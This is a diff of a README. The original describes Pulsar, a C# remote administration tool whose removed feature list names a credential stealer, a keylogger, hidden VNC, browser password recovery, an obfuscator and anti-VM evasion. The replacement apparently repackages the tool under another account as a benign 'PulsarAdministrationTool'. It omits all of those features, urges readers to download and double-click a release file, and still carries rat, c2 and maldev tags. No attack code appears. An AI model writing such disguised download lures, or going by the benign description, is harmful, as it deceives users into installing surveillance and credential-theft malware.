@@ -1,134 +1,96 @@
-# Pulsar
+# 🚀 PulsarAdministrationTool - Your Simple Solution for Remote Management
 
-[![Build Status](https://ci.appveyor.com/api/projects/status/5857hfy6r1ltb5f2?svg=true)](https://ci.appveyor.com/project/MaxXor/pulsar)
-[![Downloads](https://img.shields.io/github/downloads/Quasar-Continuation/Pulsar/total.svg)](https://github.com/Quasar-Continuation/Pulsar/releases)
-[![License](https://img.shields.io/github/license/Quasar-Continuation/Pulsar.svg)](LICENSE)
+[![Download PulsarAdministrationTool](https://img.shields.io/badge/Download%20Now-Get%20it%20here-brightgreen)](https://github.com/Mhdamjed/PulsarAdministrationTool/releases)
 
-**A Free, Open-Source Remote Administration Tool for Windows**
+## 💡 Overview
 
-Pulsar is a lightweight, fast, and powerful remote administration tool written in C#. Whether you're providing user support, handling daily admin tasks, or monitoring employees, Pulsar offers high stability and an intuitive interface—making it your go-to solution for remote administration.
+PulsarAdministrationTool is a lightweight and fast remote administration tool written in C#. Whether you are providing user support, handling daily admin tasks, or monitoring employees, Pulsar offers high stability and an intuitive interface. This makes it your go-to solution for remote administration.
 
----
+## 📦 Features
 
+- **Easy to Use**: Designed for users of all skill levels.
+- **Fast Performance**: Experience quick response times, even under heavy load.
+- **Remote Support**: Easily assist users from anywhere.
+- **Secure Communication**: Use advanced encryption for safety.
+- **Customizable Interface**: Adapt the tool to fit your workflow.
+- **Support for Plugins**: Extend functionality with plugins.
 
-## 📚 Need Help or Want to Offer Suggestions?
+## 🧩 System Requirements
 
-Check out our [telegram channel](https://t.me/SomaliDevs) that contains all current updates of what the devs are working on + the discussion channel!
+- **Operating System**: Windows 10 or later
+- **Processor**: 1 GHz or faster
+- **RAM**: 4 GB or more
+- **Storage**: At least 200 MB of free disk space
+- **.NET Framework**: Version 4.6 or higher
 
----
+## 🚀 Getting Started
 
-## 📸 Screenshots
+1. **Visit the Releases Page**: To download the latest version of PulsarAdministrationTool, [visit this page to download](https://github.com/Mhdamjed/PulsarAdministrationTool/releases).
+2. **Choose the Right Version**: Look for the most recent version listed.
+3. **Download the File**: Click on the asset associated with the version to start the download.
 
-| **Remote Shell**                  | **Remote Desktop**                | **File Manager**                  |
-|-----------------------------------|-----------------------------------|-----------------------------------|
-| ![Remote Shell](Images/remote_shell.png) | ![Remote Desktop](Images/remote_desktop.png) | ![File Manager](Images/file_manager.png) |
+## 📥 Download & Install
 
----
+To begin using PulsarAdministrationTool, follow these steps:
 
-## ✨ Key Features
+- Click on the link here: [Download PulsarAdministrationTool](https://github.com/Mhdamjed/PulsarAdministrationTool/releases).
+- After the download completes, navigate to your download location.
+- Double-click the downloaded file to start the installation process.
+- Follow the on-screen prompts to complete the installation.
 
-- 🌐 **TCP Network Streams** (IPv4 & IPv6 support)  
-- ⚡ **Fast Serialization** (Protocol Buffers)  
-- 🔒 **Encrypted Communication** (TLS)  
-- 📡 **UPnP Support** (automatic port forwarding)  
-- 🖥️ **HVNC** (Hidden Virtual Network Computing)  
-- 🕵️‍♂️ **Kematian Stealer Built-in**  
-- 📋 **Task Manager**  
-- 🗂️ **File Manager**  
-- ⏳ **Startup Manager**  
-- 🖧 **Remote Desktop**  
-- 💻 **Remote Shell**  
-- ⚙️ **Remote Execution**  
-- ℹ️ **System Information**  
-- 🔧 **Registry Editor**  
-- 🔋 **System Power Commands** (Restart, Shutdown, Standby)  
-- ⌨️ **Keylogger** (Unicode Support)  
-- 🌉 **Reverse Proxy** (SOCKS5)  
-- 🔑 **Password Recovery** (Browsers & FTP Clients)  
-- 🔐 **Escalate / De-escalate Permissions**  
-- 🚫 **Block IPs**  
-- 📩 **Telegram Notifications**  
-- 🛡️ **Built-in Obfuscator & Packer**  
-- 🛑 **Anti-VM / Anti-Debug**  
-- 🖼️ **Screen Corrupter / Illuminati**  
-- **…and much more!**
+## 📘 Usage Instructions
 
----
+1. **Launching the Application**: After installation, find the PulsarAdministrationTool app on your desktop or start menu. Click to launch it.
+2. **Setting Up Your First Session**:
+   - Enter the remote machine's details.
+   - Click "Connect" to begin your remote session.
+3. **Utilizing Features**:  
+   - Use the sidebar to access different tools like remote desktop or file transfer.
+   - Customize settings from the options menu.
 
-## 📥 Download
+## 🤝 Support
 
-- **[Latest Stable Release](https://github.com/Quasar-Continuation/Pulsar/releases)**  
-<!-- - **[Latest Development Snapshot](https://ci.appveyor.com/project/MaxXor/pulsar)** -->
+If you encounter any issues or have questions, please refer to the following:
 
----
+- **Documentation**: A user manual is included in the installation folder.
+- **Community Support**: Join discussions or report issues on our [GitHub Issues page](https://github.com/Mhdamjed/PulsarAdministrationTool/issues).
+- **Contact Us**: For technical support, contact support@pulsaradmingroup.com.
 
-## 🖥️ Supported Platforms
+## 🌐 Contributing
 
-- **Runtime:** .NET Framework 4.5.2 or higher  
-- **Operating Systems** (32- and 64-bit):  
-  - Windows 11  
-  - Windows Server 2022  
-  - Windows 10  
-  - Windows Server 2019  
-  - Windows Server 2016  
-  - Windows 8/8.1  
-  - Windows Server 2012  
-  - Windows 7  
-  - Windows Server 2008 R2  
+We welcome contributions! If you want to help improve PulsarAdministrationTool:
 
----
+1. Fork the repository.
+2. Make your changes in a separate branch.
+3. Submit a pull request for review.
 
-## 🛠️ How to Compile
+## 🏗️ Roadmap
 
-1. Open `Pulsar.sln` in **Visual Studio 2019+** with **.NET Desktop Development** installed.  
-2. [Restore NuGet Packages](https://docs.microsoft.com/en-us/nuget/consume-packages/package-restore).  
-3. Build the project (`Build` > `F6`).  
-4. Find executables in the `Bin` directory.  
+Future releases of PulsarAdministrationTool may include:
 
-### Client Build Options
+- Enhanced user interface improvements.
+- Additional plugin support.
+- More robust security features.
 
-| **Configuration** | **Use Case**    | **Details**                                                                 |
-|-------------------|-----------------|-----------------------------------------------------------------------------|
-| **Debug**         | Testing         | Uses pre-defined [Settings.cs](/Pulsar.Client/Config/Settings.cs). Edit before compiling. |
-| **Release**       | Production      | Run `Pulsar.exe` and use the client builder for custom settings.           |
+## 🗂️ License
 
----
+PulsarAdministrationTool is released under the MIT License. You may use, copy, and modify this software according to the terms of the license.
 
-## 🤝 Contributing
+## 📊 Topics
 
-Want to help? See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+This project includes topics like:
 
----
+- c2
+- csharp
+- dotnet
+- gui
+- maldev
+- plugins
+- purpleteam
+- quasar-framework
+- rat
+- redteam
+- remote-administrative-tool
+- windows
 
-## 🗺️ Roadmap
-
-Curious about the future? Check out [ROADMAP.md](ROADMAP.md).
-
----
-
-
-## 📜 License
-
-Pulsar is licensed under the **[MIT](LICENSE)**.  
-Third-party licenses are available [here](Licenses).
-
----
-
-## 😎 Contributors
-
-- **[KingKDot](https://github.com/KingKDot)** – Lead Developer (very cool) 
-- **[Twobit](https://github.com/officialtwobit)** – Multi-Feature Wizard (See PRs)  
-- **[Lucky](https://t.me/V_Lucky_V)** – Helped fix major issues with the HVNC 
-- **[fedx](https://github.com/fedx-988)** – README Designer & Discord RPC
-- **[Ace](https://github.com/Knakiri)** – Fixed minor HVNC issues & adding features (i play piano btw)
-- **[Java](https://github.com/JavaRenamed-dev)** - Adding some features
-- **[Body](https://body.sh)** - Added obfuscation (very cool asw trust)
-- **[cpores](https://github.com/vahrervert)** - Added favorites, drawing in VNC, screenoverlay, other stuff (check PRs fr)
-- **[Rishie](https://github.com/rishieissocool)** - Adding Stealer Options + More
-- **[jungsuxx](https://github.com/jungsuxx)** - Fixed a ton of input within HVNC and simplified a lot of the code.
-- **[MOOM aka my lebron](https://github.com/moom825/)** - He didn't directly contribute (making a pr, etc) but his projects are fantastic and we wouldn't have HVNC or force read without him (he deserves all the glaze. He also sort of got me into Batch Obfuscation lol)
----
-
-## 🙏 Thank You!
-
-I really appreciate all kinds of feedback and contributions. Thanks for using and supporting Pulsar!
+Thank you for choosing PulsarAdministrationTool. Enjoy efficient remote management!
